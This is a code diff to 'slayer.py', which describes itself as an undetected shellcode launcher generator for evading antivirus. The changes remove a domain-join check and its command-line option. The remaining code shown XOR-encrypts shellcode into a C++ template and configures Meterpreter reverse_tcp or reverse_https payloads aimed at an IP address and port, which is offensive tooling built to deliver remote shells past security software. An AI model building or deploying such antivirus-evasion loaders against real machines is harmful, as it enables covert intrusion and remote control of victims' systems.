@@ -106,7 +106,7 @@ int main(int argc, char** argv)
     template.close()
 
 
-def slayer(domain,payload_type, ip, port, arch):
+def slayer(payload_type, ip, port, arch):
     xorkey = get_random_string()
     buf = get_random_string()
     shellcode = get_random_string()
@@ -133,7 +133,6 @@ def slayer(domain,payload_type, ip, port, arch):
     template = open("template.cpp", "rt")
     data = template.read()
     time.sleep(1)
-    data = data.replace('if (!Isdomainjoined(L"//CHANGETHISFORDOMAIN")) {', 'if (!Isdomainjoined(L"'+ domain +'")) {')
     data = data.replace('unsigned char buf[] = " ";', "unsigned char buf[] = " + ciphertext + " ")
     data = data.replace('char key[] = " "','char key[] = "' + xorkey + '"')
     data = data.replace("key", xorkey)
@@ -180,17 +179,16 @@ banner ='''
 
 def main():
     print(banner)
-    print("Additional options: -d for domain -t for payload, -a for architecture, -p for port number, -i for IP address\n")
+    print("Additional options:-t for payload, -a for architecture, -p for port number, -i for IP address\n")
     parser = argparse.ArgumentParser(description="Slayer: Undetected shellcode launcher generator, an AV Slayer..", 
     usage="slayer.py -t payload type -i IP address -p port number -a architecture \nExample: slayer.py -P windows/x64/meterpreter/reverse_tcp -i eth0 interface -p 4444 -a x64\n")
-    parser.add_argument('-d', '--domain', help="Define domain")
     parser.add_argument('-t', '--type', help="Define connection type eg. reverse_tcp, reverse_https, reverse_http", type=str, default="tcp")
     parser.add_argument('-i', '--ip', help="IP address for payload", type=str, default="eth0")
     parser.add_argument('-p', '--port', help="Port for payload", type=str, default=443)
     parser.add_argument('-a', '--arch', help="Architecture for payload", type=str, default="x64")
     args = parser.parse_args()
     try:
-        slayer(args.domain,args.type,args.ip, args.port, args.arch)
+        slayer(args.type,args.ip, args.port, args.arch)
         print("[*] Initialising slayer()")
     except:
         print("[*] slayer() failed? :(")
